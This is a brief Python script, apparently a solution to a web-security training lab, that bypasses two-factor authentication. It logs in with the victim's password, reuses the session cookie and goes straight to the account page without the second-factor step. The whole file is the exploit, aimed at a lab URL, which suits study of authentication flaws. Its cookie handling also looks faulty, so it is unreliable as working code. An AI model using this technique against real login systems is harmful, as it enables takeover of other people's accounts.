# 2FA simple bypass
import requests

url = "https://0ae1009803c7997fc0bb785600d50004.web-security-academy.net" #please change url :)
username = "carlos"
password = "montoya"

def solve(URL):
    req = requests.Session()
    req = requests.post(url+"/login", data={"username": username, "password": password})
    cookie =  req.request.headers['Cookie'].split('=')[1]
    req = requests.post(URL+"/my-account", cookies={"session": cookie})
    print(req.url)

if __name__ == "__main__":
    solve(url)
